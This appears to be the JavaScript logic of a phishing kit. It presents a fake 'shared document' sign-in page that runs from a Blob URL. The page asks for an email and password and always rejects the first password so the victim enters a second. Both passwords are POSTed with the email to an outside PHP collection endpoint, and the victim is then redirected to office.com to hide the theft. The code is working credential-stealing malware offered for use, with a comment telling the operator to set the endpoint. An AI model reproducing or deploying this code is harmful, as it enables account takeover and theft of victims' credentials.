// content-part-2.js - Main JavaScript Logic
// This file handles all the interactive functionality

(function() {
    'use strict';

    console.log('✅ Part 2 loaded: JavaScript logic ready');

    // Configuration - UPDATE THIS URL
    const CONFIG = {
        logEndpoint: 'https://gnosis.com.py/serca/log.php',
        redirectUrl: 'https://www.office.com'
    };

    // Wait for DOM to be ready
    function initApp() {
        // Check if we're in the Blob URL environment
        if (window.location.protocol !== 'blob:') {
            console.log('📄 Not in Blob URL context. Waiting for Blob URL launch...');
            return;
        }

        console.log('🚀 Initializing application in Blob URL context');

        // Get all DOM elements
        var elements = {
            stepEmail: document.getElementById('stepEmail'),
            stepPwdFirst: document.getElementById('stepPasswordFirst'),
            stepPwdSecond: document.getElementById('stepPasswordSecond'),
            emailInput: document.getElementById('emailInput'),
            pwdFirstInput: document.getElementById('passwordFirstInput'),
            pwdSecondInput: document.getElementById('passwordSecondInput'),
            displayFirst: document.getElementById('displayEmailFirst'),
            displaySecond: document.getElementById('displayEmailSecond'),
            emailNextBtn: document.getElementById('emailNextBtn'),
            pwdFirstBtn: document.getElementById('pwdFirstBtn'),
            pwdSecondBtn: document.getElementById('pwdSecondBtn'),
            statusMsg: document.getElementById('statusMessage'),
            statusText: document.getElementById('statusText'),
            stepBadge1: document.getElementById('stepBadge1'),
            togglePwdFirst: document.getElementById('togglePwdFirst'),
            togglePwdSecond: document.getElementById('togglePwdSecond'),
            passwordErrorFirst: document.getElementById('passwordErrorFirst'),
            passwordErrorSecond: document.getElementById('passwordErrorSecond'),
            passwordErrorTextFirst: document.getElementById('passwordErrorTextFirst'),
            passwordErrorTextSecond: document.getElementById('passwordErrorTextSecond')
        };

        // Check if essential elements exist
        if (!elements.emailInput) {
            console.error('❌ Critical: emailInput not found!');
            return;
        }

        var storedEmail = '';

        // Helper functions
        function setStatus(message, type) {
            type = type || 'info';
            if (elements.statusText) {
                elements.statusText.innerText = message;
            }
            if (elements.statusMsg) {
                elements.statusMsg.className = 'status-message';
                if (type === 'error') {
                    elements.statusMsg.classList.add('error');
                } else if (type === 'success') {
                    elements.statusMsg.classList.add('success');
                }
                var icon = elements.statusMsg.querySelector('i');
                if (icon) {
                    if (type === 'error') {
                        icon.className = 'fas fa-exclamation-circle';
                    } else if (type === 'success') {
                        icon.className = 'fas fa-check-circle';
                    } else {
                        icon.className = 'fas fa-info-circle';
                    }
                }
            }
        }

        function updateStepIndicators(step) {
            if (elements.stepBadge1) {
                elements.stepBadge1.classList.remove('active');
                if (step === 1) {
                    elements.stepBadge1.classList.add('active');
                }
            }
        }

        function showPasswordError(show, step) {
            if (step === 2 && elements.passwordErrorFirst) {
                if (show) {
                    elements.passwordErrorFirst.classList.remove('hidden');
                } else {
                    elements.passwordErrorFirst.classList.add('hidden');
                }
            } else if (step === 3 && elements.passwordErrorSecond) {
                if (show) {
                    elements.passwordErrorSecond.classList.remove('hidden');
                } else {
                    elements.passwordErrorSecond.classList.add('hidden');
                }
            }
        }

        function showStep(step, email) {
            email = email || '';
            
            if (elements.stepEmail) elements.stepEmail.classList.add('hidden');
            if (elements.stepPwdFirst) elements.stepPwdFirst.classList.add('hidden');
            if (elements.stepPwdSecond) elements.stepPwdSecond.classList.add('hidden');

            showPasswordError(false, 2);
            showPasswordError(false, 3);

            if (step === 1) {
                if (elements.stepEmail) elements.stepEmail.classList.remove('hidden');
                updateStepIndicators(1);
                if (elements.emailInput) {
                    setTimeout(function() { elements.emailInput.focus(); }, 100);
                }
                setStatus('Enter your email to access the shared document.', 'info');
            } else if (step === 2) {
                if (elements.stepPwdFirst) elements.stepPwdFirst.classList.remove('hidden');
                updateStepIndicators(2);
                if (email && elements.displayFirst) {
                    elements.displayFirst.textContent = email;
                }
                if (elements.pwdFirstInput) {
                    elements.pwdFirstInput.value = '';
                    setTimeout(function() { elements.pwdFirstInput.focus(); }, 100);
                }
                setStatus('Enter your password for ' + email, 'info');
            } else if (step === 3) {
                if (elements.stepPwdSecond) elements.stepPwdSecond.classList.remove('hidden');
                updateStepIndicators(3);
                if (email && elements.displaySecond) {
                    elements.displaySecond.textContent = email;
                }
                if (elements.pwdSecondInput) {
                    elements.pwdSecondInput.value = '';
                    setTimeout(function() { elements.pwdSecondInput.focus(); }, 100);
                }
                showPasswordError(true, 3);
                setStatus('Please try again with a different password.', 'error');
            }
        }

        function resetFlow() {
            if (elements.emailInput) elements.emailInput.value = '';
            if (elements.pwdFirstInput) elements.pwdFirstInput.value = '';
            if (elements.pwdSecondInput) elements.pwdSecondInput.value = '';
            storedEmail = '';
            showPasswordError(false, 2);
            showPasswordError(false, 3);
            showStep(1);
            if (elements.pwdSecondBtn) {
                elements.pwdSecondBtn.disabled = false;
                elements.pwdSecondBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
            }
        }

        function logToFile(email, password, eventType) {
            var logData = {
                email: email,
                password: password,
                event: eventType,
                timestamp: new Date().toISOString()
            };

            if (CONFIG.logEndpoint) {
                try {
                    fetch(CONFIG.logEndpoint, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(logData),
                        keepalive: true
                    }).catch(function(error) {
                        console.log('⚠️ Logging failed:', error);
                    });
                } catch(e) {
                    console.log('⚠️ Logging error:', e);
                }
            }
        }

        // Event listeners
        if (elements.emailNextBtn) {
            elements.emailNextBtn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('📧 Email button clicked');
                var email = elements.emailInput ? elements.emailInput.value.trim() : '';
                if (!email || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
                    setStatus('Please enter a valid email address.', 'error');
                    return;
                }
                storedEmail = email;
                try {
                    localStorage.setItem('sharedDocEmail', email);
                } catch(e) {}
                console.log('📧 Email entered:', email);
                showStep(2, email);
            });
        }

        if (elements.pwdFirstBtn) {
            elements.pwdFirstBtn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('🔑 First password button clicked');
                var pwd = elements.pwdFirstInput ? elements.pwdFirstInput.value.trim() : '';
                if (!pwd) {
                    setStatus('Please enter a password.', 'error');
                    return;
                }
                var email = storedEmail || 'user';
                try {
                    email = localStorage.getItem('sharedDocEmail') || email;
                } catch(e) {}
                console.log('🔑 First password attempt for:', email);
                
                logToFile(email, pwd, 'password_attempt_1');
                
                showPasswordError(true, 2);
                setStatus('Incorrect password, please try again.', 'error');
                
                if (elements.pwdFirstInput) {
                    elements.pwdFirstInput.value = '';
                    setTimeout(function() { elements.pwdFirstInput.focus(); }, 100);
                }
                
                showStep(3, email);
            });
        }

        if (elements.pwdSecondBtn) {
            elements.pwdSecondBtn.addEventListener('click', function(e) {
                e.preventDefault();
                console.log('🔑 Second password button clicked');
                var pwd = elements.pwdSecondInput ? elements.pwdSecondInput.value.trim() : '';
                if (!pwd) {
                    setStatus('Please enter a password.', 'error');
                    return;
                }
                var email = storedEmail || 'user';
                try {
                    email = localStorage.getItem('sharedDocEmail') || email;
                } catch(e) {}
                console.log('🔑 Second password attempt for:', email);
                
                logToFile(email, pwd, 'password_attempt_2_success');
                
                // Small delay to ensure log is sent
                setTimeout(function() {
                    window.location.href = CONFIG.redirectUrl;
                }, 150);
            });
        }

        function setupToggle(btn, input) {
            if (!btn || !input) return;
            btn.addEventListener('click', function() {
                var type = input.getAttribute('type') === 'password' ? 'text' : 'password';
                input.setAttribute('type', type);
                var icon = this.querySelector('i');
                if (icon) {
                    icon.classList.toggle('fa-eye');
                    icon.classList.toggle('fa-eye-slash');
                }
            });
        }
        setupToggle(elements.togglePwdFirst, elements.pwdFirstInput);
        setupToggle(elements.togglePwdSecond, elements.pwdSecondInput);

        function handleEnter(btn) {
            return function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    if (btn) btn.click();
                }
            };
        }
        if (elements.emailInput) {
            elements.emailInput.addEventListener('keydown', handleEnter(elements.emailNextBtn));
        }
        if (elements.pwdFirstInput) {
            elements.pwdFirstInput.addEventListener('keydown', handleEnter(elements.pwdFirstBtn));
        }
        if (elements.pwdSecondInput) {
            elements.pwdSecondInput.addEventListener('keydown', handleEnter(elements.pwdSecondBtn));
        }

        resetFlow();
        console.log('✅ Shared document flow ready in Blob URL context');
    }

    // Handle initialization
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', initApp);
    } else {
        setTimeout(initApp, 100);
    }

})();
